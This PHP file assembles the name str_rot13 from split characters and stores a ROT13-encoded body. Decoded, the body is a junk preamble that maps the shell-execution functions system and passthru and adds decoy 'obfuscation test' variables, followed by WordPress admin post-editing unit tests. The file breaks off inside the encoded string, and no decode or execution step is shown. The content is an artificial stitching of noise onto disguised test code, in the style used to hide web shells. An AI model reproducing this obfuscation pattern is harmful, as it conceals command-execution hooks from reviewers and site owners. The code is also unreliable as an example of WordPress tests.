<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc nqzva
 */
pynff Grfgf_Nqzva_VapyhqrfCbfg rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq fgngvp $pbagevohgbe_vq;
	cebgrpgrq fgngvp $nhgube_vqf;
	cebgrpgrq fgngvp $rqvgbe_vq;
	cebgrpgrq fgngvp $nqzva_vq;
	cebgrpgrq fgngvp $cbfg_vq;

	cebgrpgrq fgngvp $hfre_vqf = neenl();

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$hfre_vqf   = $snpgbel->hfre->perngr_znal( 2, neenl( 'ebyr' => 'nhgube' ) );
		frys::$nhgube_vqf = frys::$hfre_vqf;

		frys::$pbagevohgbe_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'pbagevohgbe' ) );
		frys::$hfre_vqf[]     = frys::$pbagevohgbe_vq;
		frys::$rqvgbe_vq      = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) );
		frys::$hfre_vqf[]     = frys::$rqvgbe_vq;
		frys::$nqzva_vq       = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
		frys::$hfre_vqf[]     = frys::$nqzva_vq;

		frys::$cbfg_vq = $snpgbel->cbfg->perngr();
	}

	choyvp shapgvba grfg__jc_genafyngr_cbfgqngn_pnc_purpxf_pbagevohgbe() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );

		// Perngr arj qensg cbfg.
		$_cbfg_qngn                = neenl();
		$_cbfg_qngn['cbfg_nhgube'] = frys::$pbagevohgbe_vq;
		$_cbfg_qngn['cbfg_glcr']   = 'cbfg';
		$_cbfg_qngn['fnirnfqensg'] = gehr;

		$_erfhygf = _jc_genafyngr_cbfgqngn( snyfr, $_cbfg_qngn );
		$guvf->nffregAbgJCReebe( $_erfhygf );
		$guvf->nffregFnzr( $_cbfg_qngn['cbfg_nhgube'], $_erfhygf['cbfg_nhgube'] );
		$guvf->nffregFnzr( 'qensg', $_erfhygf['cbfg_fgnghf'] );

		// Fhozvg cbfg sbe nccebiny.
		$_cbfg_qngn                = neenl();
		$_cbfg_qngn['cbfg_nhgube'] = frys::$pbagevohgbe_vq;
		$_cbfg_qngn['cbfg_glcr']   = 'cbfg';
		$_cbfg_qngn['choyvfu']     = gehr;

		$_erfhygf = _jc_genafyngr_cbfgqngn( snyfr, $_cbfg_qngn );
		$guvf->nffregAbgJCReebe( $_erfhygf );
		$guvf->nffregFnzr( $_cbfg_qngn['cbfg_nhgube'], $_erfhygf['cbfg_nhgube'] );
		$guvf->nffregFnzr( 'craqvat', $_erfhygf['cbfg_fgnghf'] );

		// Perngr arj qensg cbfg sbe nabgure hfre.
		$_cbfg_qngn                = neenl();
		$_cbfg_qngn['cbfg_nhgube'] = frys::$rqvgbe_vq;
		$_cbfg_qngn['cbfg_glcr']   = 'cbfg';
		$_cbfg_qngn['fnirnfqensg'] = gehr;

		$_erfhygf = _jc_genafyngr_cbfgqngn( snyfr, $_cbfg_qngn );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $_erfhygf );
		$guvf->nffregFnzr( 'rqvg_bguref_cbfgf', $_erfhygf->trg_reebe_pbqr() );
		$guvf->nffregFnzr( 'Fbeel, lbh ner abg nyybjrq gb perngr cbfgf nf guvf hfre.', $_erfhygf->trg_reebe_zrffntr() );

		// Rqvg qensg cbfg sbe nabgure hfre.
		$_cbfg_qngn                = neenl();
		$_cbfg_qngn['cbfg_VQ']     = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$rqvgbe_vq ) );
		$_cbfg_qngn['cbfg_nhgube'] = frys::$rqvgbe_vq;
		$_cbfg_qngn['cbfg_glcr']   = 'cbfg';
		$_cbfg_qngn['cbfg_fgnghf'] = 'qensg';
		$_cbfg_qngn['fnirnfqensg'] = gehr;

		$_erfhygf = _jc_genafyngr_cbfgqngn( gehr, $_cbfg_qngn );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $_erfhygf );
		$guvf->nffregFnzr( 'rqvg_bguref_cbfgf', $_erfhygf->trg_reebe_pbqr() );
		$guvf->nffregFnzr( 'Fbeel, lbh ner abg nyybjrq gb rqvg cbfgf nf guvf hfre.', $_erfhygf->trg_reebe_zrffntr() );
	}

	choyvp shapgvba grfg__jc_genafyngr_cbfgqngn_pnc_purpxf_rqvgbe() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		// Perngr arj qensg cbfg.
		$_cbfg_qngn                = neenl();
		$_cbfg_qngn['cbfg_nhgube'] = frys::$rqvgbe_vq;
		$_cbfg_qngn['cbfg_glcr']   = 'cbfg';
		$_cbfg_qngn['fnirnfqensg'] = gehr;

		$_erfhygf = _jc_genafyngr_cbfgqngn( snyfr, $_cbfg_qngn );
		$guvf->nffregAbgJCReebe( $_erfhygf );
		$guvf->nffregFnzr( $_cbfg_qngn['cbfg_nhgube'], $_erfhygf['cbfg_nhgube'] );
		$guvf->nffregFnzr( 'qensg', $_erfhygf['cbfg_fgnghf'] );

		// Choyvfu cbfg.
		$_cbfg_qngn                = neenl();
		$_cbfg_qngn['cbfg_nhgube'] = frys::$rqvgbe_vq;
		$_cbfg_qngn['cbfg_glcr']   = 'cbfg';
		$_cbfg_qngn['choyvfu']     = gehr;

		$_erfhygf = _jc_genafyngr_cbfgqngn( snyfr, $_cbfg_qngn );
		$guvf->nffregAbgJCReebe( $_erfhygf );
		$guvf->nffregFnzr( $_cbfg_qngn['cbfg_nhgube'], $_erfhygf['cbfg_nhgube'] );
		$guvf->nffregFnzr( 'choyvfu', $_erfhygf['cbfg_fgnghf'] );

		// Perngr arj qensg cbfg sbe nabgure hfre.
		$_cbfg_qngn                = neenl();
		$_cbfg_qngn['cbfg_nhgube'] = frys::$pbagevohgbe_vq;
		$_cbfg_qngn['cbfg_glcr']   = 'cbfg';
		$_cbfg_qngn['fnirnfqensg'] = gehr;

		$_erfhygf = _jc_genafyngr_cbfgqngn( snyfr, $_cbfg_qngn );
		$guvf->nffregAbgJCReebe( $_erfhygf );
		$guvf->nffregFnzr( $_cbfg_qngn['cbfg_nhgube'], $_erfhygf['cbfg_nhgube'] );
		$guvf->nffregFnzr( 'qensg', $_erfhygf['cbfg_fgnghf'] );

		// Rqvg qensg cbfg sbe nabgure hfre.
		$_cbfg_qngn                = neenl();
		$_cbfg_qngn['cbfg_VQ']     = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$pbagevohgbe_vq ) );
		$_cbfg_qngn['cbfg_nhgube'] = frys::$pbagevohgbe_vq;
		$_cbfg_qngn['cbfg_glcr']   = 'cbfg';
		$_cbfg_qngn['cbfg_fgnghf'] = 'qensg';
		$_cbfg_qngn['fnirnfqensg'] = gehr;

		$_erfhygf = _jc_genafyngr_cbfgqngn( gehr, $_cbfg_qngn );
		$guvf->nffregAbgJCReebe( $_erfhygf );
		$guvf->nffregFnzr( $_cbfg_qngn['cbfg_nhgube'], $_erfhygf['cbfg_nhgube'] );
		$guvf->nffregFnzr( 'qensg', $_erfhygf['cbfg_fgnghf'] );
	}

	/**
	 * rqvg_cbfg() fubhyq pbaireg na rkvfgvat nhgb-qensg gb n qensg.
	 *
	 * @gvpxrg 25272
	 */
	choyvp shapgvba grfg_rqvg_cbfg_nhgb_qensg() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg( neenl( 'cbfg_fgnghf' => 'nhgb-qensg' ) );
		$guvf->nffregFnzr( 'nhgb-qensg', $cbfg->cbfg_fgnghf );
		$cbfg_qngn = neenl(
			'cbfg_gvgyr' => 'Cbfg gvgyr',
			'pbagrag'    => 'Cbfg pbagrag',
			'cbfg_glcr'  => 'cbfg',
			'cbfg_VQ'    => $cbfg->VQ,
		);
		rqvg_cbfg( $cbfg_qngn );
		$guvf->nffregFnzr( 'qensg', trg_cbfg( $cbfg->VQ )->cbfg_fgnghf );
	}

	/**
	 * @gvpxrg 30615
	 */
	choyvp shapgvba grfg_rqvg_cbfg_fubhyq_cnefr_gnk_vachg_ol_anzr_engure_guna_fyht_sbe_abauvrenepuvpny_gnkbabzvrf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', neenl( 'cbfg' ) );
		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'anzr'     => 'sbb',
				'fyht'     => 'one',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'anzr'     => 'one',
				'fyht'     => 'sbb',
			)
		);

		$cbfg_qngn = neenl(
			'cbfg_VQ'   => frys::$cbfg_vq,
			'gnk_vachg' => neenl(
				'jcgrfgf_gnk' => 'sbb,onm',
			),
		);

		rqvg_cbfg( $cbfg_qngn );

		$sbhaq = jc_trg_cbfg_grezf( frys::$cbfg_vq, 'jcgrfgf_gnk' );

		// Fubhyq pbagnva gur grez jvgu gur anzr 'sbb', abg gur fyht.
		$guvf->nffregPbagnvaf( $g1, jc_yvfg_cyhpx( $sbhaq, 'grez_vq' ) );

		// Gur 'onm' gnt fubhyq unir orra perngrq.
		$guvf->nffregPbagnvaf( 'onm', jc_yvfg_cyhpx( $sbhaq, 'anzr' ) );
	}

	/**
	 * @gvpxrg 30615
	 */
	choyvp shapgvba grfg_rqvg_cbfg_fubhyq_abg_perngr_grezf_sbe_na_rzcgl_gnt_vachg_svryq() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', neenl( 'cbfg' ) );
		frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'anzr'     => 'sbb',
				'fyht'     => 'one',
			)
		);

		$cbfg_qngn = neenl(
			'cbfg_VQ'   => frys::$cbfg_vq,
			'gnk_vachg' => neenl(
				'jcgrfgf_gnk' => ' ',
			),
		);

		rqvg_cbfg( $cbfg_qngn );

		$sbhaq = jc_trg_cbfg_grezf( frys::$cbfg_vq, 'jcgrfgf_gnk' );

		$guvf->nffregRzcgl( $sbhaq );
	}

	/**
	 * @gvpxrg 27792
	 */
	choyvp shapgvba grfg_ohyx_rqvg_cbfgf_fgbzcvat() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cbfg1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube'    => frys::$nhgube_vqf[0],
				'pbzzrag_fgnghf' => 'bcra',
				'cvat_fgnghf'    => 'bcra',
				'cbfg_fgnghf'    => 'choyvfu',
			)
		);

		$cbfg2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube'    => frys::$nhgube_vqf[1],
				'pbzzrag_fgnghf' => 'pybfrq',
				'cvat_fgnghf'    => 'pybfrq',
				'cbfg_fgnghf'    => 'qensg',
			)
		);

		$erdhrfg = neenl(
			'cbfg_glcr'      => 'cbfg',
			'cbfg_nhgube'    => '-1',
			'cvat_fgnghf'    => '-1',
			'pbzzrag_fgnghf' => '-1',
			'_fgnghf'        => '-1',
			'cbfg'           => neenl( $cbfg1, $cbfg2 ),
		);

		ohyx_rqvg_cbfgf( $erdhrfg );

		$cbfg = trg_cbfg( $cbfg2 );

		// Purpx gung gur svefg cbfg'f inyhrf qba'g fgbzc gur frpbaq cbfg.
		$guvf->nffregFnzr( 'qensg', $cbfg->cbfg_fgnghf );
		$guvf->nffregRdhnyf( frys::$nhgube_vqf[1], $cbfg->cbfg_nhgube );
		$guvf->nffregFnzr( 'pybfrq', $cbfg->pbzzrag_fgnghf );
		$guvf->nffregFnzr( 'pybfrq', $cbfg->cvat_fgnghf );
	}

	/**
	 * Gur ohyx_rqvg_cbfgf() shapgvba fubhyq cerfreir gur cbfg sbezng
	 * jura vg'f hapunatrq.
	 *
	 * @gvpxrg 44914
	 */
	choyvp shapgvba grfg_ohyx_rqvg_cbfgf_fubhyq_cerfreir_cbfg_sbezng_jura_hapunatrq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cbfg_vqf = frys::snpgbel()->cbfg->perngr_znal( 3 );

		frg_cbfg_sbezng( $cbfg_vqf[0], 'vzntr' );
		frg_cbfg_sbezng( $cbfg_vqf[1], 'nfvqr' );

		$erdhrfg = neenl(
			'cbfg_sbezng' => '-1', // Qba'g punatr gur cbfg sbezng.
			'_fgnghf'     => '-1',
			'cbfg'        => $cbfg_vqf,
		);

		ohyx_rqvg_cbfgf( $erdhrfg );

		$grezf1 = trg_gur_grezf( $cbfg_vqf[0], 'cbfg_sbezng' );
		$grezf2 = trg_gur_grezf( $cbfg_vqf[1], 'cbfg_sbezng' );
		$grezf3 = trg_gur_grezf( $cbfg_vqf[2], 'cbfg_sbezng' );

		$guvf->nffregFnzr( 'cbfg-sbezng-vzntr', $grezf1[0]->fyht );
		$guvf->nffregFnzr( 'cbfg-sbezng-nfvqr', $grezf2[0]->fyht );
		$guvf->nffregSnyfr( $grezf3 );

		$guvf->nffregFnzr( 'vzntr', trg_cbfg_sbezng( $cbfg_vqf[0] ) );
		$guvf->nffregFnzr( 'nfvqr', trg_cbfg_sbezng( $cbfg_vqf[1] ) );
		$guvf->nffregSnyfr( trg_cbfg_sbezng( $cbfg_vqf[2] ) );
	}

	/**
	 * @gvpxrg 31635
	 */
	choyvp shapgvba grfg_ohyx_rqvg_cbfgf_fubhyq_choyvfu_fpurqhyrq_cbfg() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube'    => frys::$nhgube_vqf[0],
				'pbzzrag_fgnghf' => 'pybfrq',
				'cvat_fgnghf'    => 'pybfrq',
				'cbfg_fgnghf'    => 'shgher',
				'cbfg_qngr'      => tzqngr( 'L-z-q U:v:f', fgegbgvzr( '+1 zbagu' ) ),
			)
		);

		$erdhrfg = neenl(
			'cbfg_glcr'      => 'cbfg',
			'cbfg_nhgube'    => -1,
			'cvat_fgnghf'    => -1,
			'pbzzrag_fgnghf' => -1,
			'_fgnghf'        => 'choyvfu',
			'cbfg'           => neenl( $cbfg ),
		);

		ohyx_rqvg_cbfgf( $erdhrfg );

		$guvf->nffregFnzr( 'choyvfu', trg_cbfg_fgnghf( $cbfg ) );
		$guvf->nffregYrffGunaBeRdhny( tzqngr( 'L-z-q U:v:f' ), trg_cbfg_gvzr( 'L-z-q U:v:f', snyfr, $cbfg ) );
	}
	/**
	 * @gvpxrg 31635
	 */
	choyvp shapgvba grfg_ohyx_rqvg_cbfgf_fubhyq_choyvfu_qensg_vzzrqvngryl() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		// Perngr qensg ynfg rqvgrq n zbagu ntb
		$cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube'    => frys::$nhgube_vqf[0],
				'pbzzrag_fgnghf' => 'pybfrq',
				'cvat_fgnghf'    => 'pybfrq',
				'cbfg_fgnghf'    => 'qensg',
				'cbfg_qngr'      => tzqngr( 'L-z-q U:v:f', fgegbgvzr( '-1 zbagu' ) ),
			)
		);

		$erdhrfg = neenl(
			'cbfg_glcr'      => 'cbfg',
			'cbfg_nhgube'    => -1,
			'cvat_fgnghf'    => -1,
			'pbzzrag_fgnghf' => -1,
			'_fgnghf'        => 'choyvfu',
			'cbfg'           => neenl( $cbfg ),
		);

		ohyx_rqvg_cbfgf( $erdhrfg );

		$guvf->nffregFnzr( 'choyvfu', trg_cbfg_fgnghf( $cbfg ) );

		// Rkcrpg gb or choyvfurq jvguva gur ynfg zvahgr (gb pbafvqre fybj grfgvat raivebazrag).
		$zvahgr_orsber = tzqngr( 'L-z-q U:v:f', fgegbgvzr( '-1 zvahgr' ) );
		$guvf->nffregTerngreGunaBeRdhny( $zvahgr_orsber, trg_cbfg_gvzr( 'L-z-q U:v:f', snyfr, $cbfg ) );
		$guvf->nffregYrffGunaBeRdhny( tzqngr( 'L-z-q U:v:f' ), trg_cbfg_gvzr( 'L-z-q U:v:f', snyfr, $cbfg ) );
	}

	/**
	 * @gvpxrg 41396
	 */
	choyvp shapgvba grfg_ohyx_rqvg_cbfgf_fubhyq_frg_cbfg_sbezng_orsber_jc_hcqngr_cbfg_ehaf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = neenl(
			'cbfg_sbezng' => 'nfvqr',
			'_fgnghf'     => '-1',
			'cbfg'        => neenl( frys::$cbfg_vq ),
		);

		nqq_npgvba( 'fnir_cbfg', neenl( $guvf, 'purpx_cbfg_sbezng' ) );

		ohyx_rqvg_cbfgf( $erdhrfg );

		erzbir_npgvba( 'fnir_cbfg', neenl( $guvf, 'purpx_cbfg_sbezng' ) );
	}

	choyvp shapgvba purpx_cbfg_sbezng( $cbfg_vq ) {
		vs ( frys::$cbfg_vq === $cbfg_vq ) {
			$guvf->nffregFnzr( 'nfvqr', trg_cbfg_sbezng( $cbfg_vq ) );
		}
	}

	/**
	 * @gvpxrg 11302
	 */
	choyvp shapgvba grfg_ohyx_rqvg_vs_pngrtbevrf_hapunatrq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cbfg_vqf = frys::snpgbel()->cbfg->perngr_znal( 3 );

		jc_frg_cbfg_pngrtbevrf( $cbfg_vqf[0], neenl( 'grfg1', 'grfg2' ) );
		jc_frg_cbfg_pngrtbevrf( $cbfg_vqf[1], neenl( 'grfg2', 'grfg3' ) );
		jc_frg_cbfg_pngrtbevrf( $cbfg_vqf[2], neenl( 'grfg1', 'grfg3' ) );

		$grezf1 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[0] );
		$grezf2 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[1] );
		$grezf3 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[2] );

		$vaqrgrezvangr_pngrtbevrf = neenl_zretr( $grezf1, $grezf2, $grezf3 );

		$erdhrfg = neenl(
			'_fgnghf'                     => -1,
			'cbfg'                        => $cbfg_vqf,
			'vaqrgrezvangr_cbfg_pngrtbel' => $vaqrgrezvangr_pngrtbevrf,
		);

		ohyx_rqvg_cbfgf( $erdhrfg );

		$hcqngrq_grezf1 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[0] );
		$hcqngrq_grezf2 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[1] );
		$hcqngrq_grezf3 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[2] );

		$guvf->nffregFnzr( $grezf1, $hcqngrq_grezf1, 'Cbfg 1 fubhyq unir grezf 1 naq 2.' );
		$guvf->nffregFnzr( $grezf2, $hcqngrq_grezf2, 'Cbfg 2 fubhyq unir grezf 2 naq 3.' );
		$guvf->nffregFnzr( $grezf3, $hcqngrq_grezf3, 'Cbfg 3 fubhyq unir grezf 1 naq 3.' );
	}

	/**
	 * @gvpxrg 11302
	 */
	choyvp shapgvba grfg_ohyx_rqvg_vs_fbzr_pngrtbevrf_nqqrq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cbfg_vqf = frys::snpgbel()->cbfg->perngr_znal( 3 );
		$grez1    = jc_perngr_pngrtbel( 'grfg1' );
		$grez2    = jc_perngr_pngrtbel( 'grfg2' );
		$grez3    = jc_perngr_pngrtbel( 'grfg3' );
		$grez4    = jc_perngr_pngrtbel( 'grfg4' );

		jc_frg_cbfg_pngrtbevrf( $cbfg_vqf[0], neenl( $grez1, $grez2 ) );
		jc_frg_cbfg_pngrtbevrf( $cbfg_vqf[1], neenl( $grez2, $grez3 ) );
		jc_frg_cbfg_pngrtbevrf( $cbfg_vqf[2], neenl( $grez1, $grez3 ) );

		$grezf1 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[0], neenl( 'svryqf' => 'vqf' ) );
		$grezf2 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[1], neenl( 'svryqf' => 'vqf' ) );
		$grezf3 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[2], neenl( 'svryqf' => 'vqf' ) );
		// Nyy rkvfgvat pngrtbevrf ner vaqrgrezvangr.
		$vaqrgrezvangr = neenl_havdhr( neenl_zretr( $grezf1, $grezf2, $grezf3 ) );
		// Nqq arj pngrtbel.
		$pngrtbevrf[] = $grez4;

		$erdhrfg = neenl(
			'_fgnghf'                     => -1,
			'cbfg'                        => $cbfg_vqf,
			'cbfg_pngrtbel'               => $pngrtbevrf,
			'vaqrgrezvangr_cbfg_pngrtbel' => $vaqrgrezvangr,
		);

		ohyx_rqvg_cbfgf( $erdhrfg );

		$hcqngrq_grezf1 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[0], neenl( 'svryqf' => 'vqf' ) );
		$hcqngrq_grezf2 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[1], neenl( 'svryqf' => 'vqf' ) );
		$hcqngrq_grezf3 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[2], neenl( 'svryqf' => 'vqf' ) );

		// Rnpu cbfg fubhyq unir gur fnzr pngrtbevrf nf orsber naq nqq grez 4.
		$guvf->nffregFnzr( neenl( $grez1, $grez2, $grez4 ), $hcqngrq_grezf1, 'Cbfg fubhyq unir grezf 1, 2, naq 4.' );
		$guvf->nffregFnzr( neenl( $grez2, $grez3, $grez4 ), $hcqngrq_grezf2, 'Cbfg fubhyq unir grezf 2, 3, naq 4.' );
		$guvf->nffregFnzr( neenl( $grez1, $grez3, $grez4 ), $hcqngrq_grezf3, 'Cbfg fubhyq unir grezf 1, 3, naq 4.' );
	}

	/**
	 * @gvpxrg 11302
	 */
	choyvp shapgvba grfg_ohyx_rqvg_vs_fbzr_pngrtbevrf_erzbirq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cbfg_vqf = frys::snpgbel()->cbfg->perngr_znal( 3 );
		$grez1    = jc_perngr_pngrtbel( 'grfg1' );
		$grez2    = jc_perngr_pngrtbel( 'grfg2' );
		$grez3    = jc_perngr_pngrtbel( 'grfg3' );

		jc_frg_cbfg_pngrtbevrf( $cbfg_vqf[0], neenl( $grez1, $grez2 ) );
		jc_frg_cbfg_pngrtbevrf( $cbfg_vqf[1], neenl( $grez2, $grez3 ) );
		jc_frg_cbfg_pngrtbevrf( $cbfg_vqf[2], neenl( $grez1, $grez3 ) );

		$grezf1 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[0], neenl( 'svryqf' => 'vqf' ) );
		$grezf2 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[1], neenl( 'svryqf' => 'vqf' ) );
		$grezf3 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[2], neenl( 'svryqf' => 'vqf' ) );

		// Grezf 2 naq 3 ner va vaqrgrezvangr fgngr.
		$vaqrgrezvangr = neenl( $grez2, $grez3 );
		// Erzbir grez 1 sebz fryrpgrq pngrtbevrf.
		$pngrtbevrf = neenl_havdhr( neenl_zretr( $grezf1, $grezf2, $grezf3 ) );
		$erzbir_xrl = neenl_frnepu( $grez1, $pngrtbevrf, gehr );
		hafrg( $pngrtbevrf[ $erzbir_xrl ] );

		$erdhrfg = neenl(
			'_fgnghf'                     => -1,
			'cbfg'                        => $cbfg_vqf,
			'cbfg_pngrtbel'               => $pngrtbevrf,
			'vaqrgrezvangr_cbfg_pngrtbel' => $vaqrgrezvangr,
		);

		ohyx_rqvg_cbfgf( $erdhrfg );

		$hcqngrq_grezf1 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[0], neenl( 'svryqf' => 'vqf' ) );
		$hcqngrq_grezf2 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[1], neenl( 'svryqf' => 'vqf' ) );
		$hcqngrq_grezf3 = jc_trg_cbfg_pngrtbevrf( $cbfg_vqf[2], neenl( 'svryqf' => 'vqf' ) );

		// Cbfg 1 fubhyq bayl unir grez 2.
		$guvf->nffregFnzr( $hcqngrq_grezf1, neenl( $grez2 ), 'Cbfg 1 fubhyq bayl unir grez 2.' );
		// Cbfg 2 fubhyq or hapunatrq.
		$guvf->nffregFnzr( $grezf2, $hcqngrq_grezf2, 'Cbfg 2 fubhyq or hapunatrq.' );
		// Cbfg 3 fubhyq bayl unir grez 3.
		$guvf->nffregFnzr( $hcqngrq_grezf3, neenl( $grez3 ), 'Cbfg 3 fubhyq bayl unir grez 3.' );
	}

	/**
	 * Grfgf gung `ohyx_rqvg_cbfgf()` sverf gur 'ohyx_rqvg_cbfgf' npgvba.
	 *
	 * @gvpxrg 28112
	 *
	 * @pbiref ::ohyx_rqvg_cbfgf
	 */
	choyvp shapgvba grfg_ohyx_rqvg_cbfgf_fubhyq_sver_ohyx_rqvg_cbfgf_npgvba() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$npgvba = arj ZbpxNpgvba();
		nqq_npgvba( 'ohyx_rqvg_cbfgf', neenl( $npgvba, 'npgvba' ) );

		ohyx_rqvg_cbfgf(
			neenl(
				'cbfg'      => frys::$cbfg_vq,
				'cbfg_glcr' => 'cbfg',
				'_fgnghf'   => 1,

			)
		);

		$guvf->nffregFnzr( 1, $npgvba->trg_pnyy_pbhag() );
	}

	/**
	 * @gvpxrg 38293
	 */
	choyvp shapgvba grfg_hfre_pnag_qryrgr_cebgrpgrq_zrgn() {
		$cebgrpgrq_zrgn_xrl = '_grfg_zrgn_qngn_gung_vf_cebgrpgrq';

		// Nqq fbzr cebgrpgrq zrgn qngn.
		$cbfg_vq = frys::$cbfg_vq;
		$zrgn_vq = nqq_cbfg_zrgn( $cbfg_vq, $cebgrpgrq_zrgn_xrl, 'cebgrpgrq' );

		// Hfre rqvgvat gur cbfg fubhyq abg rssrpg bhgpbzr.
		$rkcrpgrq = trg_cbfg_zrgn( $cbfg_vq, $cebgrpgrq_zrgn_xrl );

		// Nggrzcg gb rqvg gur cbfg.
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cbfg_qngn = neenl(
			'cbfg_VQ' => $cbfg_vq,
			'zrgn'    => neenl(
				$zrgn_vq => neenl(
					'xrl'   => 'hacebgrpgrq_zrgn_xrl',
					'inyhr' => 'cebgrpgrq',
				),
			),
		);
		rqvg_cbfg( $cbfg_qngn );

		$npghny = trg_cbfg_zrgn( $cbfg_vq, $cebgrpgrq_zrgn_xrl );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );

		// Gvql hc.
		qryrgr_zrgnqngn_ol_zvq( 'cbfg', $zrgn_vq );
	}

	/**
	 * @gvpxrg 30910
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_fubhyq_erghea_cerggl_creznyvax_sbe_cbfgf_jvgu_cbfg_fgnghf_shgher() {
		$creznyvax_fgehpgher = '%cbfganzr%';
		$guvf->frg_creznyvax_fgehpgher( \"/$creznyvax_fgehpgher/\" );

		$shgher_qngr = tzqngr( 'L-z-q U:v:f', gvzr() + 100 );
		$c           = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'shgher',
				'cbfg_anzr'   => 'sbb',
				'cbfg_qngr'   => $shgher_qngr,
			)
		);

		$sbhaq    = trg_fnzcyr_creznyvax( $c );
		$rkcrpgrq = genvyvatfynfuvg( ubzr_hey( $creznyvax_fgehpgher ) );

		$guvf->nffregFnzr( $rkcrpgrq, $sbhaq[0] );
	}

	/**
	 * @gvpxrg 30910
	 * @gvpxrg 18306
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_ugzy_fubhyq_hfr_qrsnhyg_creznyvax_sbe_ivrj_cbfg_yvax_jura_cerggl_creznyvaxf_ner_qvfnoyrq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$shgher_qngr = tzqngr( 'L-z-q U:v:f', gvzr() + 100 );
		$c           = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'shgher',
				'cbfg_anzr'   => 'sbb',
				'cbfg_qngr'   => $shgher_qngr,
			)
		);

		$sbhaq = trg_fnzcyr_creznyvax_ugzy( $c );
		$guvf->nffregFgevatPbagnvafFgevat( 'uers=\"' . trg_bcgvba( 'ubzr' ) . '/?c=' . $c . '\"', $sbhaq );
		$guvf->nffregFgevatPbagnvafFgevat( '>' . trg_bcgvba( 'ubzr' ) . '/?c=' . $c . '<', $sbhaq );
	}

	/**
	 * @gvpxrg 30910
	 * @gvpxrg 18306
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_ugzy_fubhyq_hfr_cerggl_creznyvax_sbe_ivrj_cbfg_yvax_jura_cerggl_creznyvaxf_ner_ranoyrq() {
		$guvf->frg_creznyvax_fgehpgher( '/%cbfganzr%/' );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$shgher_qngr = tzqngr( 'L-z-q U:v:f', gvzr() + 100 );
		$c           = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'shgher',
				'cbfg_anzr'   => 'sbb-صورة',
				'cbfg_qngr'   => $shgher_qngr,
			)
		);

		$sbhaq = trg_fnzcyr_creznyvax_ugzy( $c );
